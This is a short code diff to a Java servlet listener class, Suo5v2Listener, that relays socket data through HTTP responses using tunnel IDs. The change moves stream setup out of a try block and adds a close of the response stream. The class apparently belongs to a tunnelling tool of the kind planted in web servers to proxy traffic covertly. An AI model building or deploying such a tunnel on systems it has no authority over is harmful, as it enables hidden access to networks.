@@ -335,10 +335,10 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
 
         Thread t = null;
         boolean sendClose = true;
+        final OutputStream scOutStream = socket.getOutputStream();
+        final InputStream scInStream = socket.getInputStream();
+        final OutputStream respOutputStream = resp.getOutputStream();
         try {
-            final OutputStream scOutStream = socket.getOutputStream();
-            final InputStream scInStream = socket.getInputStream();
-            final OutputStream respOutputStream = resp.getOutputStream();
 
             Suo5v2Listener p = new Suo5v2Listener(scInStream, respOutputStream, tunId);
             t = new Thread(p);
@@ -370,14 +370,16 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
             }
         } catch (Exception ignored) {
         } finally {
-
             try {
                 socket.close();
             } catch (Exception ignored) {
             }
-
             if (sendClose) {
                 writeAndFlush(resp, marshalBase64(newDel(tunId)), 0);
+            }
+            try {
+                respOutputStream.close();
+            } catch (Exception ignored) {
             }
             if (t != null) {
                 t.join();
